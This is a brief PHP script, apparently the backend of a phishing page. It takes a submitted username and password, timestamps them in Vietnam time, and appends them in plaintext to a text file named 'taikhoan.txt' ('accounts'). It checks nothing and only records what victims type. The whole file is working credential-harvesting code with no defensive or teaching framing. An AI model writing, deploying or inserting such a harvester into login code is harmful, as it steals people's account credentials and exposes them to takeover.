<?php
date_default_timezone_set("Asia/Ho_Chi_Minh");

$name = $_POST['name'];
$pass = $_POST['pass'];

$date = date('d/m/Y - H:i:s');
$filepath = '../taikhoan.txt';

$str = "- Gio: $date | Tai khoan: $name | Mat khau: $pass\n";

file_put_contents($filepath, file_get_contents($filepath) . $str);
?>
